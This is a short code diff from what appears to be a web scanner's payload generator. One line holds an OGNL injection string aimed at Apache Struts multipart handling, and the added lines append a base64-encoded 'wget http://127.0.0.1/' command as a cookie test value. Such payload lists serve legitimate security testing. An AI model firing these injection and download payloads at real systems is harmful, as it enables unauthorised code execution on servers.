@@ -78,6 +78,8 @@ for doing in doings:
         findings.append("%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('xuh9ugc2','1')}.multipart/form-data")
         pass # Nothing to do yet
     elif doing == "cookie":
+        findings = [_ for _ in findings if not _.startswith("d2dldCBodHR")]
+        findings.append("d2dldCBodHRwOi8vMTI3LjAuMC4xLw==")
         pass # Nothing to do yet
     elif doing == "from":
         pass # Nothing to do yet
